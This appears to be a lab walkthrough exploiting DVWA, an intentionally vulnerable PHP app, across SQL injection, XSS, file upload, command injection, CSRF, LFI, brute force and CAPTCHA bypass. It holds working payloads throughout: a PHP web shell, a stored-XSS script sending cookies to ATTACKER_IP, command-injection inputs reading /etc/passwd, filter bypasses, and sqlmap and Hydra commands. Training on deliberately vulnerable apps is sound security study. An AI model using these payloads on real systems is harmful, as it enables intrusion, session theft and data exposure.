# 🌐 Walkthrough: DVWA — Full Exploitation Guide

**Platform:** DVWA (Damn Vulnerable Web Application)  
**Environment:** Local VM — VirtualBox/VMware  
**Difficulty Levels:** Low → Medium → High  
**Status:** ✅ All vulnerabilities exploited

---

## 📝 Overview

DVWA is an intentionally vulnerable PHP/MySQL web application designed for security professionals to practice common web vulnerabilities in a safe, legal environment. This walkthrough covers exploitation at all three security levels.

---

## 🏗️ Setup

```bash
# Option 1: Docker (recommended)
docker run --rm -it -p 80:80 vulnerables/web-dvwa

# Option 2: Manual on Kali/Ubuntu
git clone https://github.com/digininja/DVWA
# Follow installation in DVWA/README.md

# Access: http://localhost/dvwa/
# Default creds: admin / password
```

---

## 🔓 Vulnerability 1: SQL Injection

### Security Level: Low

**URL:** `http://localhost/dvwa/vulnerabilities/sqli/`

```
Input: ' OR '1'='1
Result: All users returned ✅

Input: 1' UNION SELECT user(), database() -- -
Result: Leaks DB user and name ✅

Input: 1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database() -- -
Result: Tables listed ✅
```

### Security Level: Medium

**Defense:** `mysql_real_escape_string()` on input  
**Bypass:** Use `sqlmap` with `--tamper=space2comment`:

```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=xxx; security=medium" \
  --level=3 --risk=2 --dbs
```

### Security Level: High

**Defense:** `PDO::prepare()` with parameterized query  
**Result:** Cannot bypass with standard techniques — properly secured ✅

---

## 🔓 Vulnerability 2: Cross-Site Scripting (XSS)

### Reflected XSS — Low

```html
Input: <script>alert(document.cookie)</script>
Result: Alert fires with session cookie ✅
```

### Stored XSS — Low

Posted in the message/name field:
```html
<script>new Image().src="http://ATTACKER_IP/steal?c="+document.cookie</script>
```

### DOM XSS — Low

```
URL: http://localhost/dvwa/vulnerabilities/xss_d/?default=<script>alert(1)</script>
Result: Alert fires ✅
```

### XSS — High Level Bypass

Default has `htmlspecialchars()` — use JavaScript events:
```html
<img src=x onerror=alert(1)>
```

---

## 🔓 Vulnerability 3: File Upload → RCE

### Low Security

Uploaded `shell.php`:
```php
<?php if(isset($_GET['cmd'])) echo shell_exec($_GET['cmd']); ?>
```

Triggered: `http://localhost/dvwa/hackable/uploads/shell.php?cmd=id`  
Result: `uid=33(www-data)` ✅

### Medium Security — MIME Bypass

Used Burp Suite to change `Content-Type: image/jpeg` while uploading PHP shell.  
Result: Upload succeeded, same RCE ✅

### High Security

Validates magic bytes, extension, and size. To bypass:
```
1. Create file: shell.php.jpg
2. Use .htaccess upload to force PHP execution:
   AddType application/x-httpd-php .jpg
```

---

## 🔓 Vulnerability 4: Command Injection

### Low Security

```
Input: 127.0.0.1; id
Result: uid=33(www-data) ✅

Input: 127.0.0.1 && cat /etc/passwd
Result: /etc/passwd contents ✅
```

### High Security — Bypass Blacklist

The filter removes `&& || ; |` — use `|` without space:
```
Input: 127.0.0.1|id
Result: Command executed ✅
```

---

## 🔓 Vulnerability 5: CSRF

### Low Security

Created a malicious HTML page that auto-submits a password change form when visited by the victim:

```html
<html>
<body onload="document.forms[0].submit()">
<form action="http://localhost/dvwa/vulnerabilities/csrf/"
      method="GET">
  <input type="hidden" name="password_new" value="hacked">
  <input type="hidden" name="password_conf" value="hacked">
  <input type="hidden" name="Change" value="Change">
</form>
</body>
</html>
```

When admin visits this page while logged in → password changed ✅

---

## 🔓 Vulnerability 6: Local File Inclusion (LFI)

### Low Security

```
http://localhost/dvwa/vulnerabilities/fi/?page=../../../etc/passwd
Result: /etc/passwd contents ✅

# PHP filter trick — read source code
http://localhost/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php
Result: Base64-encoded PHP source ✅
```

---

## 🔓 Vulnerability 7: Brute Force Login

```bash
# Using Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  TARGET_IP http-get-form \
  "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie:PHPSESSID=xxx; security=low"
```

---

## 🔓 Vulnerability 8: Insecure CAPTCHA

CAPTCHA bypass via parameter manipulation:
```
Intercept password change request
Modify: step=2 (skip CAPTCHA check)
Result: Password changed without valid CAPTCHA ✅
```

---

## 📊 Exploitation Matrix

| Vulnerability | Low | Medium | High | Technique |
|---------------|-----|--------|------|-----------|
| SQLi | ✅ | ✅ | ❌ | UNION, Boolean |
| Reflected XSS | ✅ | ✅ | ✅ | `<script>`, events |
| Stored XSS | ✅ | ✅ | ✅ | `<script>`, img onerror |
| DOM XSS | ✅ | ✅ | Partial | URL fragment |
| File Upload | ✅ | ✅ | Partial | MIME bypass, .htaccess |
| Command Injection | ✅ | ✅ | ✅ | `;`, `\|`, newline |
| CSRF | ✅ | Partial | ❌ | Token bypass |
| LFI | ✅ | ✅ | Partial | `../`, php://filter |
| Brute Force | ✅ | ✅ | ❌ | Hydra |

---

## 🧠 Key Takeaways

1. **Security level matters** — High security often properly mitigates attacks
2. **WAF bypass** — Filters based on blacklists are almost always bypassable
3. **Defense in depth** — Single controls are insufficient; layer your defenses
4. **Parameterized queries** work; string concatenation does not
5. **CSRF tokens** are essential for state-changing operations

---

*All exploitation performed in an isolated local DVWA environment. No live systems targeted.*
